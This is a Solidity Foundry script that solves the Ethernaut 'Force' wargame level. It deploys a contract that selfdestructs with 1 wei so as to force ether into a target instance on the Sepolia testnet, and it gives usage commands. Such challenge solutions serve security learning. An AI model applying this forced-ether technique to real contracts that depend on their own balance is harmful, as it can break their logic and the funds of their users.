// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Force.sol";

/*
    Solution script for the Ethernaut Level 6: Force

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in ForceScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Force.s.sol:ForceScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Force.s.sol/11155111
*/

contract ForceAttack {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}


contract ForceScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x0DcB6fe633C7Db193640f7076E8639218a8E119d;

    function run() external {
        vm.startBroadcast();

        // send 1 wei to the ForceAttack contract and immediately selfdestruct it 
        // which frces the 1 wei balance into the target (instance) contract
        new ForceAttack{value: 1}(payable(address(instance)));

        // check the balance of the target contract is > 0 otherwise revert
        require(instance.balance > 0, "balance not greater than 0");

        vm.stopBroadcast();
    }
}